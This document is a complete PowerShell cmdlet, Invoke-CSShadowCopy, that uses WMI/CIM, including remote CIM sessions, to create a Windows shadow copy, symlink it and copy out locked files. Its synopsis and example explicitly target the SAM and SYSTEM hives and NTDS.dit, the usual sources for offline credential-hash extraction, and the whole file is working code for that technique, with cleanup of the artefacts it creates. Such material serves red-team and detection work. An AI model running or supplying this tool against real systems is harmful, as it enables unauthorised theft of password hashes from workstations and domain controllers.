function Invoke-CSShadowCopy
{
     <#
    .SYNOPSIS
    This cmdlet can be used to copy files from a shadow copy. Useful for copying locked files, such as the SAM and SYSTEM hive files or NTDS.dit

    .DESCRIPTION
    This cmdlet is used to copy files from a shadow copy to a local or remote destination. 

    .PARAMETER Session

    Cim Session to use for this function

    .PARAMETER SymlinkTempPath

    The temporary path that will be used to create the symlink

    .PARAMETER SourcePath

    The full path to the file to copy.

    .PARAMETER DestinationPath

    The full path to where the file should be copied. 

    .EXAMPLE

    Invoke-CSShadowCopy -SourcePath 'C:\Windows\System32\SAM' -DestinationPath 'C:\SAM'

    Copy the SAM hive file from a local shadow copy to a local location, using the default temporary symlink path.

    .EXAMPLE

    Invoke-CSShadowCopy -SymlinkTempPath 'C:\Users\test\AppData' -SourcePath 'C:\Users\test\lockedfile.txt' -DestinationPath 'C:\lockedfile.txt'

    Copy a locked file from a shadowcopy, using the specified temp symlinkpath, to the destination path.
    #>

    [CmdletBinding()]
    param
    (
        [parameter()]
        [ValidateNotNullOrEmpty()]
        [Alias("Session")]
        [Microsoft.Management.Infrastructure.CimSession[]]
        $CimSession,

        [parameter(Mandatory = $False)]
        [ValidateNotNullOrEmpty()]
        [Alias("LinkPath")]
        [string]$SymLinkTempPath,

        [parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('^[a-zA-Z]:\\')]
        [Alias("Source")]
        [string]$SourcePath,

        [parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('(^[a-zA-Z]:\\)')]
        [Alias("Destination")]
        [string]$DestinationPath
    )

    BEGIN
    {
        if (-not $PSBoundParameters['CimSession'])
        {
            $CimSession = ''
        }

        if (-not $PSBoundParameters['SymLinkTempPath'])
        {
            $SymLinkTempPath = 'C:\SC'
        }
    }

    PROCESS
    {
        foreach($Session in $CimSession)
        {
            $methodArgs = @{
                ClassName = 'Win32_ShadowCopy'
                Namespace = 'root\cimv2'
                MethodName = 'Create'
            }
            $commonArgs = @{}

            $drive = $SourcePath.Split('\')[0]
            $drive += '\'

            $Args = @{
                Context = 'ClientAccessible'
                Volume = $drive + '\'
            }
            
            #check for CimSession
            if($Session.Id) {$commonArgs['CimSession'] = $Session}

            $methodArgs['Arguments'] = $Args

            #create a shadow copy
            $result = Invoke-CimMethod @methodArgs @commonArgs

            if ($result.ReturnValue -eq 0)
            {
                $ShadowID = $result.ShadowID
            }
            else
            {
                Write-Verbose "[!] Unable to create shadow copy"
                break
            }

            $DeviceObject = (Get-CimInstance -ClassName Win32_ShadowCopy -Namespace root/CIMV2 -Filter "ID=`'$ShadowID`'" @commonArgs).DeviceObject

            $symlinkpath = $SymLinkTempPath + ($SourcePath -replace '^[a-zA-Z]:',"")
            $symlinkpath = $symlinkpath.Replace('\','\\')
            
            #create a Symlink to the shadowcopy's deviceobject path
            $command = "cmd.exe /C MKLINK /D $SymLinkTempPath $DeviceObject\"

            $methodArgs['ClassName'] = 'Win32_Process'
            $methodArgs['Namespace'] = 'root\cimv2'
            $methodArgs['MethodName'] = 'Create'
            $methodArgs['Arguments'] = @{commandline = $command}

            $result = Invoke-CimMethod @methodArgs @commonArgs

            if($result.ReturnValue -ne 0)
            {
                Write-Verbose "[!] The command $command `n[!] Did not execute successfully!"
                break
            }
            $DestinationPath = $DestinationPath.Replace('\','\\')
            #Get an instance of the file to be copied and then copy it to the destinationPath
            $instance = Get-CimInstance -ClassName CIM_LogicalFile -Namespace root/CIMV2 -Filter "Name=`'$symlinkPath`'" @commonArgs
            if ($instance)
            {
                $result = Invoke-CimMethod -InputObject $instance -MethodName 'Copy' -Arguments @{Filename = $DestinationPath} @commonArgs
                if ($result.ReturnValue -ne 0)
                {
                    Write-Verbose "[!] Unable to copy file from $symlinkpath to $DestinationPath"
                    break
                }
            }

            $command = "cmd.exe /C rmdir $SymLinkTempPath"

            $methodArgs['Arguments'] = @{commandline = $command}

            $result = Invoke-CimMethod @methodArgs @commonArgs

            if ($result.ReturnValue -ne 0)
            {
                Write-Verbose "[!] Unable to remove the symlink directory"
                break
            }

            #Cleanup the shadowcopy 
            $instance = Get-CimInstance -ClassName Win32_ShadowCopy -Namespace root/CIMV2 -Filter "ID=`'$ShadowID`'" @commonArgs
            if ($instance)
            {
                Remove-CimInstance -InputObject $instance @commonArgs
            }
            
            Get-CimInstance -ClassName CIM_LogicalFile -Namespace root/CIMV2 -Filter "Name=`'$DestinationPath`'" @commonArgs
        }
    }
    END{}
}